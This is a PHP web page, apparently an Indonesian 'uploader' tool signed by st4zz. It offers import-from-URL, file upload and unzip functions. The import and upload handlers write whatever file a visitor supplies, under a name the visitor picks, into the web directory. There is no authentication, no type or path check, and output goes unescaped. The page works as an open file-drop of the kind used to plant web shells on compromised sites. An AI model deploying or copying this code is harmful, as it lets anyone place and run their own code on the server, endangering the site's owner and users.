<!doctype html>
<html lang="en">
  <head>
  <!-- st4zz Project -->
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="theme-color" content="#6c757d" />
  <meta name="msapplication-navbutton-color" content="#6c757d" />
  <meta name="msapplication-TileColor" content="#6c757d"/>
  <meta name="apple-mobile-web-app-capable" content="yes" />
  <meta name="apple-mobile-web-app-status-bar-style" content="#6c757d" />
  <title>Import Upload Unzip Project</title>
  <!-- Bootstrap CSS -->
  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.11.0/css/all.css" />
  <!-- Favicon -->
  <link rel="shortcut icon" href="https://github.githubassets.com/favicon.ico" type="img/x-icon"/>
  <link rel="icon" href="https://github.githubassets.com/favicon.ico" type="image/x-icon"/>
<style>
@import url(https://fonts.googleapis.com/css?family=Ubuntu:400,700);
@import url(https://fonts.googleapis.com/css?family=Lobster:400,700);
@import url(https://fonts.googleapis.com/css?family=Josefin+Sans:400,700);

html {
	position: relative;
}

body {
	font-family: Ubuntu;
}

nav { 	font-family: Lobster;
text-decoration: none;
}

.import label {
	font-family: Josefin Sans;
}
.import h2 {
	font-family: Lobster;
text-decoration: underline;
}
.upload h2 {
	font-family: Lobster;
text-decoration: underline;
}
.unzip h2 {
	font-family: Lobster;
text-decoration: underline;
}

footer a {
color:#fff;
text-shadow: 1px 1px 10px #ff0000;
}
</style>
  </head>
<body>
<nav class="navbar top navbar-expand-lg navbar-dark bg-secondary">
<div class="container">
<a class="navbar-brand" href="#"><i class="fas fa-home"></i> XProject</a>
<button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation"><span class="navbar-toggler-icon"></span></button>
<div class="collapse navbar-collapse" id="navbarNav"><ul class="navbar-nav">
<li class="nav-item"><a class="nav-link" href="#import"><i class="fas fa-link"></i> Import File</a></li>
<li class="nav-item"><a class="nav-link" href="#upload"><i class="fas fa-upload"></i> Upload File</a></li>
<li class="nav-item"><a class="nav-link" href="#unzip"><i class="fas fa-file-archive"></i> Unzip File</a></li>
</ul>
</div>
</div>
</nav>
<?php
if($_POST['act'] == 'Mulai Import File' &&$_POST['url'] != '')
{$url=$_POST['url']; $nama=$_POST['nama'];
// Jika nama file tidak diisi, maka nama filenya akan sama dengan nama file yang kita import.
if($nama == '')
{$file=basename($url);}
// Kalo kita masukkan nama filenya, maka nama filenya akan berubah sesuai dengan nama yg kita masukkan.
else{$file=$nama;}
// File berhasil di import.
if(copy($url,$file))
{echo '<div class="alert alert-success text-center" role="alert"><i class="fas fa-check-circle"></i> File berhasil diimport dan disimpan sebagai “<u><a title="Visit Link" href="./'.$file;
{echo '"><b><i class="far fa-external-link-square"></i> '.$file;
{echo '</b></a></u>”</div>';}}}
// File gagal di import.
else {echo '<div class="alert alert-danger text-center" role="alert"><i class="fas fa-exclamation-triangle"></i> Gagal mengimport file <b>'.basename($url).'';} echo '</b></div>';}
echo '<section id="import" class="import mb-4">
<div class="container">
<div class="row mb-4 pt-2">
<div class="col text-center">
<h2><i class="fas fa-link"></i> Import File Menu</h2>
</div>
</div>';
echo '<div class="row justify-content-center">
<div class="col-lg-8">
<form method="post">
<div class="form-group text-center">
<label for="url">Masukkan URL File</label>
<input type="text" class="form-control" name="url"></div>
<div class="form-group text-center">
<label for="nama">Disimpan Sebagai (Optional):</label>
<input type="text" class="form-control" name="nama"></div>
<center><input type="submit" class="btn btn-secondary" name="act" value="Mulai Import File" class="submit"></center>
</form>
</div>
</div>
</div>
</div>
</section>';
?>
<hr/>
<?php
echo '<section id="upload" class="upload mb-4">
<div class="container">
<div class="row mb-3 pt-2">
<div class="col text-center"><h2><i class="fas fa-upload"></i> Upload File Menu</h2>
</div>
</div>';
echo '<div class="row justify-content-center">
<div class="col-lg-8">
<form method="post" enctype="multipart/form-data" name="uploader" id="uploader">
<p align="center"><input class="form-control" type="file" name="file"></p>
<p align="center"><input name="_upl" type="submit" id="_upl" value="Mulai Upload File" class="btn btn-secondary"></p>
</form>
</div>
</div>
</div>
</section>';
if( $_POST['_upl'] == "Mulai Upload File" ) {
if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<div class="alert alert-success text-center" role="alert"><i class="fas fa-check-circle"></i> File “<u><b><a title="Visit Link" href="./'.$_FILES['file']['name'].'">'.$_FILES['file']['name'].'</a></b></u>” berhasil diupload...!!!</div><br/>'; }
else { echo '<div class="alert alert-danger text-center" role="alert"><i class="fas fa-exclamation-triangle"></i> File gagal diupload...!!!</div><br/>'; }
}
?>
<hr/>
<?php
/**
 * The Unzipper extracts .zip archives and .gz files by st4zz
  */

$timestart = microtime(TRUE);

$arc = new Unzipper;

$timeend = microtime(TRUE);
$time = $timeend - $timestart;

class Unzipper {
  public $localdir = '.';
  public $zipfiles = array();
  public static $status = '';

  public function __construct() {

    //read directory and pick .zip and .gz files
    if ($dh = opendir($this->localdir)) {
      while (($file = readdir($dh)) !== FALSE) {
        if (pathinfo($file, PATHINFO_EXTENSION) === 'zip'
          || pathinfo($file, PATHINFO_EXTENSION) === 'gz'
        ) {
          $this->zipfiles[] = $file;
        }
      }
      closedir($dh);

      if(!empty($this->zipfiles)) {
        self::$status = '<div class="alert alert-primary text-center" role="alert"><b><i class="fas fa-thumbs-up"></i> File .ZIP atau .GZ berhasil ditemukan, silahkan pilih file untuk di ekstrak.</b></div>';
      }
      else {
        self::$status = '<div class="alert alert-danger text-center" role="alert"><b><i class="fas fa-exclamation-circle"></i> Tidak dapat menemukan file .ZIP atau .GZ didalam folder ini.</b></div>';
      }
    }

    //check if an archive was selected for unzipping
    //check if archive has been selected
    $input = '';
    $input = strip_tags($_POST['zipfile']);

    //allow only local existing archives to extract
    if ($input !== '') {
      if (in_array($input, $this->zipfiles)) {
        self::extract($input, $this->localdir);
      }
    }
  }

  public static function extract($archive, $destination) {
    $ext = pathinfo($archive, PATHINFO_EXTENSION);

    if ($ext === 'zip') {
      self::extractZipArchive($archive, $destination);
    }
    else {
      if ($ext === 'gz') {
        self::extractGzipFile($archive, $destination);
      }
    }

  }

  public static function extractZipArchive($archive, $destination) {
    // Check if webserver supports unzipping.
    if(!class_exists('ZipArchive')) {
      self::$status = '<div class="alert alert-danger text-center" role="alert"><i class="fas fa-exclamation-circle"></i> Your PHP version does not support unzip functionality.</div>';
      return;
    }

    $zip = new ZipArchive;

    // Check if archive is readable.
    if ($zip->open($archive) === TRUE) {
      // Check if destination is writable
      if(is_writeable($destination . '/')) {
        $zip->extractTo($destination);
        $zip->close();
        self::$status = '<div class="alert alert-success text-center" role="alert"><b><i class="fas fa-check-circle"></i> File berhasil di ekstrak :)</b></div>';
      }
      else {
        self::$status = '<div class="alert alert-danger text-center" role="alert"><i class="fas fa-exclamation-circle"></i> Directory not writeable by webserver.</div>';
      }
    }
    else {
      self::$status = '<div class="alert alert-danger text-center" role="alert"><i class="fas fa-exclamation-circle"></i> Tidak dapat membaca file ZIP atau GZ.</div>';
    }
  }

  public static function extractGzipFile($archive, $destination) {
    // Check if zlib is enabled
    if(!function_exists('gzopen')) {
      self::$status = '<div class="alert alert-danger text-center" role="alert"><i class="fas fa-exclamation-circle"></i> Your PHP has no zlib support enabled.</div>';
      return;
    }

    $filename = pathinfo($archive, PATHINFO_FILENAME);
    $gzipped = gzopen($archive, "rb");
    $file = fopen($filename, "w");

    while ($string = gzread($gzipped, 4096)) {
      fwrite($file, $string, strlen($string));
    }
    gzclose($gzipped);
    fclose($file);

    // Check if file was extracted.
    if(file_exists($destination . '/' . $filename)) {
      self::$status = '<div class="alert alert-success text-center" role="alert"><b><i class="fas fa-check-circle"></i> File berhasil di ekstrak :)</b></div>';
    }
    else {
      self::$status = '<div class="alert alert-danger text-center" role="alert"><b><i class="fas fa-exclamation-triangle"></i> Error mengekstrak file, mungkin file corrupt atau memiliki sandi!</b></div>';
    }
  }
}
?>
<section id="unzip" class="unzip mb-4">
<div class="container">
<div class="row mb-3 pt-2">
<div class="col text-center">
<h2><i class="fas fa-file-archive"></i> Unzip File Menu</h2>
</div>
</div>
<div class="row justify-content-center">
<div class="col-lg-8">
<?php echo $arc::$status; ?>
<form action="" method="POST">
  <p align="center"><fieldset>
    <select name="zipfile" size="1" class="custom-select" id="zipfile">
      <?php foreach ($arc->zipfiles as $zip) {
        echo "<option selected>Silahkan Pilih...</option>
      <option>$zip</option>";
      }
      ?>
    </select>
  </fieldset></p>
    <div align="center"><input type="submit" name="submit" class="btn btn-secondary" value="Mulai UnZip File"/></div>
</form>
</div>
</div>
</section>
<footer class="bg-secondary mt-5 text-white">
<div class="container">
<div class="row pt-2 pb-2">
<div class="col">
<table width="100%"><tr><td style="text-align:left;"><button type="button" class="btn btn-primary"><a href="." title="Back to directory"><i class="fas fa-folder"></i> Back to Directory</a></button></td><td style="text-align:right;" class="btn btn-dark"><i class="fab fa-github"></i> Coded by ./st4zz</td></tr></table>
</div>
</div>
</div>
</footer>
<script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.6/umd/popper.min.js" integrity="sha384-wHAiFfRlMFy6i5SRaxvfOCifBUQy1xHdJ/yoi7FRNXMRBu5WHdZYu1hA6ZOblgut" crossorigin="anonymous"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.2.1/js/bootstrap.min.js" integrity="sha384-B0UglyR+jN6CkvvICOB2joaf5I4l3gm9GU6Hc1og6Ls7i6U/mkkaduKaBhlAXv9k" crossorigin="anonymous"></script>
</body>
</html>
